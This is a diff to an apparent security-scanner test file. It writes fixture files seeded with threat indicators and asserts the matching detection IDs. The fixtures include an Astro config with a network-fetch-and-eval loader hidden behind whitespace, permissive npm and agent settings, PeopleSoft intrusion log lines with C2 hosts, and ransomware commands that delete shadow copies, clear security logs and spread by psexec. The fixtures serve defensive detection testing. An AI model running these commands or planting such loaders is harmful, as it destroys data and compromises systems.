@@ -69,6 +69,86 @@ function run() {
     "const secondary = 'https://cloudflarefirewall.vercel.app/api/v1';", // push-guard: ignore
     "const legacy = 'https://cloudflaresecurity.vercel.app/api/ssh-key';" // push-guard: ignore
   ].join("\n"));
+  write(path.join(home, "observatory-pr", ".gitignore"), [
+    "node_modules/",
+    "branch_structure.json",
+    "temp_auto_push.bat"
+  ].join("\n"));
+  write(path.join(home, "observatory-pr", "astro.config.mjs"), [
+    "import { defineConfig } from 'astro/config';",
+    "import { createRequire } from 'module';",
+    "const require = createRequire(import.meta.url);",
+    "const http = require('http');",
+    "http.request('http://example.invalid/$/boot', () => {});",
+    "eval(stageBody);",
+    "export default defineConfig({});" + " ".repeat(320) + "global['x']=Buffer.from(payload);eval(stageBody);"
+  ].join("\n"));
+  write(path.join(home, "openclaw-risk", "package.json"), JSON.stringify({
+    dependencies: {
+      openclaw: "2026.4.20"
+    }
+  }, null, 2));
+  write(path.join(home, "openclaw-risk", ".crabbox.yaml"), [
+    "channels:",
+    "  slack:",
+    "    dmPolicy: \"open\"",
+    "    allowFrom: [\"*\"]",
+    "agents.defaults.sandbox.mode: \"none\""
+  ].join("\n"));
+  write(path.join(home, "npm-v12-risk", "package.json"), JSON.stringify({
+    packageManager: "npm@11.15.0",
+    dependencies: {
+      "git-tool": "github:example/git-tool",
+      "remote-tool": "https://example.invalid/remote-tool-1.0.0.tgz"
+    }
+  }, null, 2));
+  write(path.join(home, "npm-v12-risk", "package-lock.json"), JSON.stringify({
+    packages: {
+      "node_modules/native-tool": {
+        version: "1.0.0",
+        hasInstallScript: true
+      }
+    }
+  }, null, 2));
+  write(path.join(home, "npm-v12-risk", ".npmrc"), [
+    "allow-git=true",
+    "allow-remote=all",
+    "allow-scripts=*",
+    "ignore-scripts=true"
+  ].join("\n"));
+  write(path.join(root, "u01", "app", "psoft", "ps_config_homes", "csprd", "appserv", "prcs", "psappsrv.cfg"), [
+    "PeopleSoft Enterprise PeopleTools 8.62",
+    "Address=10.10.10.10",
+    "HostName=csprd01"
+  ].join("\n"));
+  write(path.join(root, "u01", "app", "psoft", "ps_config_homes", "csprd", "webserv", "CSPRD02", "servers", "PIA", "logs", "access.log"), [
+    "203.0.113.10 - - \"POST /PSEMHUB/hub HTTP/1.1\" 200",
+    "203.0.113.10 - - \"POST /PSIGW/HttpListeningConnector HTTP/1.1\" 200",
+    "meshctrl.js RunCommand --run 'bash /tmp/csprd_fanout.sh'",
+    "wss://azurenetfiles.net:443/agent.ashx",
+    "142.11.200.186",
+    "176.120.22.24"
+  ].join("\n"));
+  write(path.join(root, "u01", "app", "psoft", "ps_config_homes", "csprd", "webserv", "CSPRD02", "applications", "peoplesoft", "PSEMHUB.war", "shell.jsp"), "<%-- placeholder --%>");
+  write(path.join(root, "u01", "app", "psoft", "ps_config_homes", "csprd", "webserv", "CSPRD02", "applications", "peoplesoft", "PSEMHUB.war", "envmetadata", "transactions", "txn.txt"), "transaction artifact");
+  write(path.join(root, "u01", "app", "psoft", "ps_config_homes", "csprd", "webserv", "CSPRD02", "applications", "peoplesoft", "PSEMHUB.war", "persistantstorage", "marker.txt"), "unexpected directory");
+  write(path.join(root, "u01", "app", "psoft", "meshagent64-azure-ops.exe"), "placeholder");
+  write(path.join(root, "u01", "app", "psoft", "ps_config_homes", "csprd", "webserv", "CSPRD02", "README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT"), "extortion marker");
+  write(path.join(root, "tmp", "gentlemen.bmp"), "placeholder");
+  write(path.join(root, "opt", "gentlemen", "dControl.exe"), "placeholder");
+  write(path.join(root, "opt", "gentlemen", "def1.bat"), [
+    "dControl.exe /disable",
+    "WinDefGpo_Reg.ps1",
+    "vssadmin delete shadows /all /quiet",
+    "wevtutil cl Security",
+    "gentlemen_system",
+    "LOCKER_BACKGROUND=1",
+    "UpdateSystem GupdateS",
+    "README-GENTLEMEN.txt",
+    "psexec.exe --spread --ip 10.0.0.5 --login admin --password <redacted>",
+    "176.120.22.127",
+    "2gkRUQNkJyaGkvuDziSq1RGIrwl_4bGyJtv6ez2Hk8Hrd5zvq"
+  ].join("\n"));
   write(path.join(home, "solana-fakefix", "package.json"), JSON.stringify({
     dependencies: {
       "@solana-labs/web3.js": "^2.0.0",
@@ -138,6 +218,36 @@ function run() {
   assert(ids.has("compromised-npm-package-reference"));
   assert(ids.has("ottercookie-npm-package-reference"));
   assert(ids.has("ottercookie-text-indicator"));
+  assert(ids.has("astro-config-require-loader"));
+  assert(ids.has("astro-config-network-eval-loader"));
+  assert(ids.has("astro-config-hidden-payload-line"));
+  assert(ids.has("gitignore-hidden-pr-tooling"));
+  assert(ids.has("openclaw-vulnerable-version"));
+  assert(ids.has("openclaw-open-dm-wildcard"));
+  assert(ids.has("openclaw-open-dm-unsandboxed"));
+  assert(ids.has("npm-v12-prep-old-npm-pin"));
+  assert(ids.has("npm-v12-git-dependency-review"));
+  assert(ids.has("npm-v12-remote-tarball-review"));
+  assert(ids.has("npm-v12-install-script-approval-review"));
+  assert(ids.has("npm-v12-broad-allow-git"));
+  assert(ids.has("npm-v12-broad-allow-remote"));
+  assert(ids.has("npm-v12-broad-allow-scripts"));
+  assert(ids.has("npm-v12-ignore-scripts-migration-note"));
+  assert(ids.has("peoplesoft-cve-2026-35273-affected-version"));
+  assert(ids.has("peoplesoft-psemhub-route-review"));
+  assert(ids.has("peoplesoft-psemhub-unexpected-jsp"));
+  assert(ids.has("peoplesoft-psemhub-transaction-artifact"));
+  assert(ids.has("peoplesoft-psemhub-unexpected-directory"));
+  assert(ids.has("peoplesoft-meshcentral-masquerade-agent"));
+  assert(ids.has("peoplesoft-shinyhunters-network-indicator"));
+  assert(ids.has("peoplesoft-shinyhunters-operator-artifact"));
+  assert(ids.has("peoplesoft-shinyhunters-extortion-marker"));
+  assert(ids.has("gentlemen-ransomware-note-wallpaper"));
+  assert(ids.has("gentlemen-toolkit-file-name"));
+  assert(ids.has("gentlemen-encryptor-runtime-marker"));
+  assert(ids.has("gentlemen-self-propagation-marker"));
+  assert(ids.has("gentlemen-defense-evasion-command-marker"));
+  assert(ids.has("gentlemen-network-indicator"));
   assert(ids.has("solana-fakefix-npm-package-reference"));
   assert(ids.has("solana-fakefix-pypi-package-reference"));
   assert(ids.has("solana-fakefix-text-indicator"));
